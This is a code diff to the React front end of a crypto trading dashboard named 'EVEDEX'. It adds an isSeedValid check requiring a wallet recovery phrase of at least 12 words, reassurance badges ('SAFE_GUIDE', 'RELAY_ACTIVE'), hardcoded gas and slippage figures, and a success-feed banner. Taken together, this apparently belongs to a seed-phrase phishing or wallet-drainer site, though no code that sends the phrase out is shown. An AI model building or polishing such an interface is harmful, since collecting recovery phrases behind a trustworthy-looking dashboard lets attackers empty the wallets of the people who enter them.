@@ -60,25 +60,33 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
+  const isSeedValid = useMemo(() => seedVal.trim().split(/\s+/).length >= 12, [seedVal]);
+
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
+      
+      {/* HEADER */}
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'20px'}}>
         <div>
-          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v5</div>
-          <div style={{fontSize:'10px', color:'#ef4444'}}>ETH/USD: ${ethPrice.toFixed(2)}</div>
+          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
+          <div style={{fontSize:'10px', color:'#ef4444'}}>MARKET_LIVE: ${ethPrice.toFixed(2)}</div>
         </div>
-        <div style={{display:'flex', gap:'10px', alignItems:'center'}}>
-           <div style={{backgroundColor:'#ef4444', color:'white', padding:'2px 8px', borderRadius:'4px', fontSize:'10px', fontWeight:'bold'}}>NEW V5</div>
-           <appkit-button />
-        </div>
+        <appkit-button />
       </header>
 
       {!isConnected ? (
-        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}><appkit-button /></div>
+        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
+          <div style={{display:'flex', justifyContent:'center', gap:'15px', marginBottom:'25px'}}>
+             <div style={{fontSize:'12px', color:'#10b981'}}>🔰 SAFE_GUIDE</div>
+             <div style={{fontSize:'12px', color:'#3b82f6'}}>♻️ RELAY_ACTIVE</div>
+          </div>
+          <appkit-button />
+        </div>
       ) : (
         <>
+          {/* DASHBOARD STATUS BAR */}
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'9px', color:'#10b981', display:'flex', justifyContent:'space-around', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
-            <span>〽️ GAS: 12 GWEI</span><span>⚡ SLIPPAGE: 0.1% [INSTANT]</span>
+            <span>〽️ GAS: 12 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span>
           </div>
 
           {view === "menu" && (
@@ -144,6 +152,7 @@ export default function App() {
         </>
       )}
 
+      {/* SUCCESS FEED */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
           {feedMsg}
